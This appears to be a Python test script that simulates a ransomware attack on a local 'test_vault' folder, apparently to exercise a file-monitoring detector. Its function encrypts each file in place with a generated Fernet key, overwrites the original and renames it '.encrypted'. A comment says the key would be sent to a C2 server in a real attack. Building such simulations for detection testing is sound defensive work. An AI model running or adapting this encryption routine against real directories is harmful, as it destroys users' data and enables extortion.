import os
import time
from cryptography.fernet import Fernet

VAULT_DIR = "./test_vault"

def attack_encryptor():
    print("[*] Starting ATTACK: The Encryptor (High Entropy)")
    
    if not os.path.exists(VAULT_DIR):
        print(f"[!] Error: {VAULT_DIR} not found. Run setup_vault.py first.")
        return

    # Generate a key (in a real scenario, this would be sent to C2)
    key = Fernet.generate_key()
    fernet = Fernet(key)
    print(f"[*] Encryption Key Generated: {key.decode()}")

    files = [f for f in os.listdir(VAULT_DIR) if os.path.isfile(os.path.join(VAULT_DIR, f)) and not f.endswith(".encrypted")]
    
    for filename in files:
        file_path = os.path.join(VAULT_DIR, filename)
        
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            
            # Encrypt data
            encrypted = fernet.encrypt(data)
            
            # Overwrite file with encrypted data
            with open(file_path, "wb") as f:
                f.write(encrypted)
                
            # Rename to .encrypted
            new_path = file_path + ".encrypted"
            os.rename(file_path, new_path)
            
            print(f"    [!] Encrypted: {filename}")
            time.sleep(0.2) # Slow down for demo purposes (Python Watchdog latency)
        except Exception as e:
            print(f"    [x] Failed to encrypt {filename}: {e}")

    print("[*] Attack complete.")

if __name__ == "__main__":
    attack_encryptor()
